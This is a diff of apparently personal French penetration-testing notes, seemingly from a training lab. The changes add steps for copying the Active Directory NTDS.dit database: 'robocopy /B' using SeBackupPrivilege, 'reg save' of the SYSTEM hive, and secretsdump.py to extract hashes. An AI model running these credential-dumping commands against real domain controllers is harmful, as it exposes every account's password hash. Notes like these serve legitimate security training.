@@ -50,7 +50,10 @@ DISKSHADOW> exit
 **Remarque** :  Si le fichier n'est pas accessible et que l'on est membre du groupe *Backup Operator*, on pourra y accéder via le privilège **SeBackupPrivilege** (voir [[Privilèges Windows Exploitables]])
 
 ```
-# Ce cmdlet est lié à un outil référencé dans le lien ci-dessus
+# cas 1 : Robocopy "sait" utiliser le privilège SeBackupPrivilege
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
+# cas 2 : sans robocopy, ce cmdlet est lié à un outil référencé dans le lien ci-dessus
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
 
@@ -77,7 +80,8 @@ PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inla
 ### A distance
 #### Extraction des hash d'un dump NTDS.dit via secretsdump.py
 
-Prérequis : disposer d'NTDS.dit et du dump SYSTEM via 
+Prérequis : disposer d'NTDS.dit et du dump SYSTEM via `reg save HKLM\SYSTEM SYSTEM.SAV`
+
 ```shell-session
-secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+secretsdump.py -ntds ntds.dit -system SYSTEM.sav -hashes lmhash:nthash LOCAL
 ```
